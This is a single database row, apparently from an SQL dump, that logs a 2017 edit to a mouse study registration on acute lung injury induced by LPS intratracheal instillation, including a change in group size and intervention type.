	(121,98,'[{\"key\":\"study_arms\",\"old_value\":[{\"type\":\"control\",\"number\":\"16\",\"intervention\":\"Control mice consisting of PBS intratracheal instillation \"},{\"type\":\"intervention\",\"number\":\"6\",\"intervention\":\"ALI mice from LPS intratracheal instillation \"}],\"new_value\":[{\"type\":\"control\",\"number\":\"16\",\"intervention\":\"Control mice consisting of PBS intratracheal instillation \"},{\"type\":\"intervention\",\"number\":\"24\",\"intervention\":\"ALI mice from LPS intratracheal instillation \"}]},{\"key\":\"intervention_type\",\"old_value\":\"other\",\"new_value\":\"model_optimalisation\"},{\"key\":\"other_intervention_type\",\"old_value\":\"No intervention\",\"new_value\":\"LPS intratracheal instillation\"}]','2017-09-29 13:10:15','2017-09-29 13:10:15'),
